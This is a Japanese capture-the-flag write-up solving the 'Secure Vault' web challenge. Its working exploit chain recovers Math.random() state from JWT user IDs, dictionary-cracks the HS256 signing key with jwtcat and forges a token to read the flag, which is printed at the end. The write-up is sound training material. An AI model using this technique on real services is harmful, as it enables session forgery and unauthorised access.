# Secure Vault:Web:130pts
Clam saw all those cool celebrities posting everything they do on twitter, so he decided to give it a go himself. Turns out, that's a horrible idea. After recovering from his emotional trauma, he wrote a [secure vault](https://secure-vault.web.actf.co/) to store his deepest secrets. Legend has it that there's even a flag in there. Can you get it?  

[Source](index.js)  

# Solution
サイトとソースが渡される。  
アクセスするとアカウント作成後、文字列を保存できるサイトのようだ。  
Secure Vault  
[site1.png](site/site1.png)  
試しにアカウントを作ってログインすると`put something here!`とある。  
これがデフォルトのようだ。  
[site2.png](site/site2.png)  
cookieにJWT`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjM4MjUyNTA5MjY1MjQ3MzkiLCJpYXQiOjE2NTE0MDA1NDZ9.79aj7t462YjnsW1eQ35KsX4VS2d_bgCTDiu7Y4gH6uA`がセットされていた。  
[JSON Web Tokens - jwt.io](https://jwt.io/)で中身を見ると以下であった。  
```json
{
  "uid": "0.3825250926524739",
  "iat": 1651400546
}
```
uidが見える。  
次にソースを見ると主要部分は以下のようであった。  
```JavaScript
~~~
const userInfo = {};
const jwtKey = Math.random().toString();

class UserStore {
    constructor() {
        this.users = {};
        this.usernames = {};
    }

    insert(username, password) {
        const uid = Math.random().toString();
        this.users[uid] = {
            username,
            uid,
            password,
            vault: "put something here!",
            restricted: true,
        };
        this.usernames[username] = uid;
        return uid;
    }
~~~
}

~~~
const users = new UserStore();

app.use((req, res, next) => {
    try {
        res.locals.user = jwt.verify(req.cookies.token, jwtKey, {
            algorithms: ["HS256"],
        });
    } catch (err) {
        if (req.cookies.token) {
            res.clearCookie("token");
        }
    }
    next();
});

~~~
app.post("/register", (req, res) => {
    if (
        !req.body.username ||
        !req.body.password ||
        req.body.username.length > 32 ||
        req.body.password.length > 32
    ) {
~~~
    }
    const uid = users.insert(req.body.username, req.body.password);
    res.cookie("token", jwt.sign({ uid }, jwtKey, { algorithm: "HS256" }));
    res.redirect("/");
});

~~~
app.get("/vault", (req, res) => {
    if (!res.locals.user) {
        res.status(401).send("Log in first");
        return;
    }
    const user = users.get(res.locals.user.uid);
    res.type("text/plain").send(user.restricted ? user.vault : flag);
});
~~~
```
JWTでログインを維持しており、`user.restricted`でなければフラグが得られるようだ。  
しかし`HS256`であり、`Math.random().toString()`がkeyのようで、noneや総当たりでの攻撃は難しい。  
ここで、uidも`Math.random().toString()`であり、JWTに含まれていることを思い出す。  
つまりユーザ登録を行うと`Math.random()`の結果を知ることができる。  
`Math.random()`は安全でないことが知られており、[TACIXAT/XorShift128Plus](https://github.com/TACIXAT/XorShift128Plus)などで過去や未来の乱数を計算できる。  
uidより乱数を取得し、過去の乱数を生成することでJWTのkeyを辞書攻撃することを狙う。  
以下のget_uid.shよりuidを取得する。  
```sh
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki1ooooo&password=ooooo" 2>&1 | grep set-cookie
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki2ooooo&password=ooooo" 2>&1 | grep set-cookie
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki3ooooo&password=ooooo" 2>&1 | grep set-cookie
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki4ooooo&password=ooooo" 2>&1 | grep set-cookie
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki5ooooo&password=ooooo" 2>&1 | grep set-cookie
curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satoki6ooooo&password=ooooo" 2>&1 | grep set-cookie
```
実行する。  
```bash
$ ./get_uid.sh
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjM4NTIyNzQxMTIwMjk0MTQ2IiwiaWF0IjoxNjUxNDAwNzE1fQ.v87ygmvry8degrkSj5KNxbK7NWDfbbSzL_N4QUw_fFs; Path=/
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjYxMzkyNDY1MzU0MzcyMDgiLCJpYXQiOjE2NTE0MDA3MTZ9.wYmaATGDKeG8YSWGMwzQYSu8lVNri-deA73VO46WCgw; Path=/
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjI2ODA3NTE5NTY0NDEyNTg1IiwiaWF0IjoxNjUxNDAwNzE2fQ.ZrltMhyE-VO12XlQiD8X5i6DRGeyeet7t-yXRmNRCoA; Path=/
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjIxMTM5NzA0NDE2NTYxNDc4IiwiaWF0IjoxNjUxNDAwNzE3fQ.3TgUijXkqscJxRS-P9VYG36OFgYkOuKumXZNXe5czI8; Path=/
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjkyMzc0ODQ0NzkxNzA5NyIsImlhdCI6MTY1MTQwMDcxN30.IH0v70ujYvOxQBw0-jwdi_3HIXLmnk0nhQdOvFT3BmU; Path=/
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjI0OTM1MDQxNjMzMTg5NDAzIiwiaWF0IjoxNjUxNDAwNzE4fQ.2zcz1jFttIwqaoCKIjr2UeX0uHhggxCD8wE2Z4B11lY; Path=/
```
それぞれの中身を見るとuidは以下であった。  
```
0.38522741120294146
0.6139246535437208
0.26807519564412585
0.21139704416561478
0.923748447917097
0.24935041633189403
```
これらを設定し、50000個の乱数生成するよう編集したxs128p_uid.pyを実行し、辞書を作成する。  
スクリプトの実装を読んでおらず、適切な編集でないため、一定数以上の未来の乱数生成後に過去の乱数が周期的に表示されていることに注意する。  
この場合、はるか過去の乱数が欲しいため都合がよい。  
```bash
$ diff xs128p.py xs128p_uid.py
149,150c149,150
<         0.5368584449767335, 0.883588766746984, 0.7895949638905317,
<         0.5106241305628436, 0.49965622623126693]
---
>         0.38522741120294146, 0.6139246535437208, 0.26807519564412585,
>         0.21139704416561478, 0.923748447917097, 0.24935041633189403]
192c192
<         for idx in range(15):
---
>         for idx in range(50000):
$ python xs128p_uid.py > dict.txt
```
辞書ができたので、新たにアカウントを作成し、そのjwtを[jwtcat](https://github.com/aress31/jwtcat)でクラックする。  
以下のように行う。  
```bash
$ curl -X POST -v https://secure-vault.web.actf.co/register --data "username=satokihack&password=ooooo" 2>&1 | grep set-cookie
< set-cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjg2MTYwNzUzMjgyNDM5NTEiLCJpYXQiOjE2NTE0MDEzNzd9.w-xTyxA1SZfSrJqhZO7IxN8n34kNFdGbOR71eaKzwgk; Path=/
$ git clone https://github.com/aress31/jwtcat.git
~~~
$ python jwtcat/jwtcat.py wordlist -w dict.txt "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjg2MTYwNzUzMjgyNDM5NTEiLCJpYXQiOjE2NTE0MDEzNzd9.w-xTyxA1SZfSrJqhZO7IxN8n34kNFdGbOR71eaKzwgk"
2022-05-01 19:37:41,230 Satoki __main__[1298] WARNING For attacking complex JWT, it is best to use compiled, GPU accelerated password crackers such as Hashcat and John the Ripper which offer more advanced techniques such as raw brute forcing, rules-based, and mask attacks.
2022-05-01 19:37:41,230 Satoki __main__[1298] INFO Pour yourself a cup (or two) of ☕ as this operation might take a while depending on the size of your wordlist.
 34%|████████████████████████▌                                                | 50385/149983 [00:02<00:04, 22480.12it/s]
2022-05-01 19:37:43,598 Satoki __main__[1298] INFO Private key found: 0.5258726853042994
2022-05-01 19:37:43,598 Satoki __main__[1298] INFO Finished in 2.3682637214660645 sec
```
JWTのkeyが判明したため、[JSON Web Tokens - jwt.io](https://jwt.io/)で書き換えてやる。  
uidについてはユーザが存在しなければ`user.restricted`がfalseとなるので、適当にkeyと同じにしておく。  
![jwtio.png](images/jwtio.png)  
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiIwLjUyNTg3MjY4NTMwNDI5OTQiLCJpYXQiOjE2NTE0MDEzNzd9.AxE6xLl3WD9qbMaUvXKN6e7hDCvvlRC3Pq2wciGw910`が得られたので、設定してアクセスする。  
flag  
[flag.png](site/flag.png)  
flagが得られた。  

## actf{is_this_what_uaf_is}